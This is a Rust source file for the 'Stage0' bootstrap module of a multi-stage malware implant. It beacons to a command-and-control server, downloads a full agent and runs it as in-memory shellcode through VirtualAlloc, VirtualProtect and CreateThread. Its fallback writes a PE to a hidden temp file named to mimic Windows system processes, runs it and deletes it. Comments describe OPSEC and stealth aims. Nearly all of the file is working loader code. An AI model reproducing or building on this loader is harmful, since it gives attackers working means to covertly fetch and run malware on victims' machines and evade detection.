//! Stage 3: Stage0 - Position-Independent Bootstrap Payload
//!
//! **Purpose**: Minimal bootstrap that contacts C2 and downloads the full agent
//!
//! **Why this stage exists**:
//! - Keeps ESTER and JAVELIN small and generic
//! - Only Stage0 contains C2-specific logic
//! - Can be updated independently from earlier stages
//! - Downloads full agent capabilities on demand
//!
//! **OPSEC Considerations**:
//! - Runs entirely in memory (loaded by JAVELIN)
//! - Position-independent code (no fixed addresses)
//! - Minimal network signature (single beacon + download)
//! - Full agent only downloaded after successful bootstrap
//!
//! **Separation of Responsibilities**:
//! - Stage0 ONLY handles initial C2 contact and agent download
//! - Stage0 does NOT include full agent capabilities
//! - Full agent is downloaded after successful session establishment

pub mod beacon;
pub mod config;
pub mod download;
pub mod network;

pub use beacon::send_initial_beacon;
pub use config::get_c2_server;
pub use download::{download_agent, download_agent_http};
pub use network::establish_session;

/// Main entry point for Stage0
///
/// This function is called by JAVELIN after loading Stage0 into memory
///
/// **Execution flow**:
/// 1. Send initial beacon to C2
/// 2. Establish encrypted session (TLS)
/// 3. Download full agent from C2 via HTTP API
/// 4. Execute full agent in memory
///
/// # Returns
///
/// * `0` - Success
/// * `1` - Failure
#[no_mangle]
pub extern "C" fn stage0_main() -> i32 {
    #[cfg(feature = "dev")]
    println!("[STAGE0] Bootstrap payload initializing...");

    match run_bootstrap() {
        Ok(_) => {
            #[cfg(feature = "dev")]
            println!("[STAGE0] Bootstrap complete");
            0
        }
        Err(e) => {
            #[cfg(feature = "dev")]
            eprintln!("[STAGE0] Bootstrap failed: {:?}", e);
            1
        }
    }
}

/// Runs the bootstrap sequence
fn run_bootstrap() -> Result<(), Box<dyn std::error::Error>> {
    #[cfg(feature = "dev")]
    println!("[STAGE0] Starting bootstrap sequence");

    // Step 1: Send initial beacon
    #[cfg(feature = "dev")]
    println!("[STAGE0] Sending initial beacon...");
    
    send_initial_beacon()?;

    // Step 2: Establish TLS session (for beacon/keep-alive)
    #[cfg(feature = "dev")]
    println!("[STAGE0] Establishing TLS session...");
    
    let _session = establish_session()?;
    
    #[cfg(feature = "dev")]
    println!("[STAGE0] TLS session established");

    // Step 3: Download full agent via HTTP API (separate from TLS session)
    #[cfg(feature = "dev")]
    println!("[STAGE0] Downloading full agent via HTTP API...");
    
    let agent_bytes = download_agent_http()?;

    // Step 4: Execute full agent as process (write to temp, execute, delete)
    #[cfg(feature = "dev")]
    println!("[STAGE0] Executing full agent ({} bytes)", agent_bytes.len());
    
    execute_agent_as_process(&agent_bytes)?;

    Ok(())
}

/// Executes the downloaded agent as shellcode in memory (fileless)
/// The agent should be donut-converted shellcode for proper in-memory execution
fn execute_agent_as_process(agent_bytes: &[u8]) -> Result<(), Box<dyn std::error::Error>> {
    #[cfg(target_os = "windows")]
    {
        use std::ptr;
        use std::ffi::c_void;
        
        type HANDLE = *mut c_void;
        type DWORD = u32;
        type LPVOID = *mut c_void;
        type SIZE_T = usize;
        
        const MEM_COMMIT: DWORD = 0x1000;
        const MEM_RESERVE: DWORD = 0x2000;
        const PAGE_READWRITE: DWORD = 0x04;
        const PAGE_EXECUTE_READ: DWORD = 0x20;
        
        #[link(name = "kernel32")]
        extern "system" {
            fn VirtualAlloc(addr: LPVOID, size: SIZE_T, alloc_type: DWORD, protect: DWORD) -> LPVOID;
            fn VirtualProtect(addr: LPVOID, size: SIZE_T, new_protect: DWORD, old_protect: *mut DWORD) -> i32;
            fn CreateThread(
                attrs: LPVOID, stack_size: SIZE_T, start_addr: LPVOID,
                param: LPVOID, flags: DWORD, thread_id: *mut DWORD
            ) -> HANDLE;
            fn WaitForSingleObject(handle: HANDLE, ms: DWORD) -> DWORD;
        }
        
        #[cfg(feature = "dev")]
        println!("[STAGE0] Executing shellcode in memory ({} bytes)", agent_bytes.len());
        
        // Check if this looks like shellcode (not PE)
        // Shellcode typically doesn't start with MZ header
        let is_pe = agent_bytes.len() >= 2 && agent_bytes[0] == 0x4D && agent_bytes[1] == 0x5A;
        
        if is_pe {
            #[cfg(feature = "dev")]
            println!("[STAGE0] WARNING: Received PE instead of shellcode, attempting RunPE...");
            
            // Fallback to temp file execution for PE (less ideal but works)
            return execute_pe_via_temp_file(agent_bytes);
        }
        
        // Allocate RW memory
        let mem = unsafe {
            VirtualAlloc(
                ptr::null_mut(),
                agent_bytes.len(),
                MEM_COMMIT | MEM_RESERVE,
                PAGE_READWRITE,
            )
        };
        
        if mem.is_null() {
            return Err("VirtualAlloc failed".into());
        }
        
        #[cfg(feature = "dev")]
        println!("[STAGE0] Allocated {} bytes at {:p}", agent_bytes.len(), mem);
        
        // Copy shellcode to allocated memory
        unsafe {
            ptr::copy_nonoverlapping(
                agent_bytes.as_ptr(),
                mem as *mut u8,
                agent_bytes.len(),
            );
        }
        
        // Change protection to RX (execute-read, not write)
        let mut old_protect: DWORD = 0;
        let result = unsafe {
            VirtualProtect(
                mem,
                agent_bytes.len(),
                PAGE_EXECUTE_READ,
                &mut old_protect,
            )
        };
        
        if result == 0 {
            return Err("VirtualProtect failed".into());
        }
        
        #[cfg(feature = "dev")]
        println!("[STAGE0] Memory protection changed to RX");
        
        // Add exception handler extern
        #[link(name = "kernel32")]
        extern "system" {
            fn GetExitCodeThread(hThread: HANDLE, lpExitCode: *mut DWORD) -> i32;
            fn GetLastError() -> DWORD;
        }
        
        // Create thread to execute shellcode
        let thread = unsafe {
            CreateThread(
                ptr::null_mut(),
                0,
                mem,
                ptr::null_mut(),
                0,
                ptr::null_mut(),
            )
        };
        
        if thread.is_null() {
            let err = unsafe { GetLastError() };
            return Err(format!("CreateThread failed with error: {}", err).into());
        }
        
        #[cfg(feature = "dev")]
        println!("[STAGE0] Shellcode thread created, waiting for execution...");
        
        // Wait for thread with timeout to see if it crashes immediately
        // 5 second timeout for initial check
        let wait_result = unsafe { WaitForSingleObject(thread, 5000) };
        
        #[cfg(feature = "dev")]
        {
            let mut exit_code: DWORD = 0;
            unsafe { GetExitCodeThread(thread, &mut exit_code) };
            println!("[STAGE0] Wait result: {} (0=SIGNALED, 258=TIMEOUT, 0xFFFFFFFF=FAILED)", wait_result);
            println!("[STAGE0] Thread exit code: {} (259=STILL_ACTIVE, 0xC0000005=ACCESS_VIOLATION)", exit_code);
            
            if exit_code == 0xC0000005 {
                println!("[STAGE0] ERROR: Shellcode crashed with ACCESS_VIOLATION!");
            } else if exit_code == 259 {
                println!("[STAGE0] Shellcode still running, waiting indefinitely...");
            }
        }
        
        // If still running, wait indefinitely
        if wait_result == 258 { // WAIT_TIMEOUT
            unsafe { WaitForSingleObject(thread, 0xFFFFFFFF); }
        }
        
        Ok(())
    }

    #[cfg(not(target_os = "windows"))]
    {
        Err("Non-Windows execution not yet implemented".into())
    }
}

/// Fallback: Execute PE via temporary file with self-deletion
/// Uses random name, hidden attributes, and schedules self-delete
#[cfg(target_os = "windows")]
fn execute_pe_via_temp_file(pe_bytes: &[u8]) -> Result<(), Box<dyn std::error::Error>> {
    use std::fs;
    use std::process::Command;
    use std::env;
    use std::ptr;
    use std::ffi::c_void;
    
    type HANDLE = *mut c_void;
    type DWORD = u32;
    type BOOL = i32;
    type LPCWSTR = *const u16;
    
    const FILE_ATTRIBUTE_HIDDEN: DWORD = 0x02;
    const FILE_ATTRIBUTE_SYSTEM: DWORD = 0x04;
    
    #[link(name = "kernel32")]
    extern "system" {
        fn SetFileAttributesW(lpFileName: LPCWSTR, dwFileAttributes: DWORD) -> BOOL;
    }
    
    #[cfg(feature = "dev")]
    println!("[STAGE0] Fallback: Writing PE to temp file (stealth mode)");
    
    let temp_dir = env::temp_dir();
    
    // Generate random-looking name (mimics Windows system processes)
    let timestamp = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default()
        .as_nanos();
    
    // Use names that blend in with Windows
    let names = ["RuntimeBroker", "SearchProtocol", "WmiPrvSE", "dllhost", "conhost", "taskhostw"];
    let name_idx = (timestamp as usize) % names.len();
    let random_suffix = (timestamp % 10000) as u32;
    let filename = format!("{}_{}.exe", names[name_idx], random_suffix);
    let agent_path = temp_dir.join(&filename);
    
    // Write the PE
    fs::write(&agent_path, pe_bytes)?;
    
    // Set hidden + system attributes
    let wide_path: Vec<u16> = agent_path.to_string_lossy()
        .encode_utf16()
        .chain(std::iter::once(0))
        .collect();
    unsafe {
        SetFileAttributesW(wide_path.as_ptr(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
    }
    
    #[cfg(feature = "dev")]
    println!("[STAGE0] Spawning hidden: {:?}", agent_path);
    
    // Spawn the process
    let child = Command::new(&agent_path).spawn()?;
    let pid = child.id();
    
    #[cfg(feature = "dev")]
    println!("[STAGE0] Agent spawned with PID: {}", pid);
    
    // Schedule self-deletion after agent starts (5 second delay)
    // The agent will be running from memory by then
    let path_clone = agent_path.clone();
    std::thread::spawn(move || {
        std::thread::sleep(std::time::Duration::from_secs(5));
        // Try to delete multiple times (file might be locked initially)
        for _ in 0..10 {
            if fs::remove_file(&path_clone).is_ok() {
                #[cfg(feature = "dev")]
                println!("[STAGE0] Temp file deleted successfully");
                break;
            }
            std::thread::sleep(std::time::Duration::from_secs(2));
        }
    });
    
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_stage0_config() {
        // Verify configuration is accessible
        let server = get_c2_server();
        assert!(!server.is_empty());
    }
}
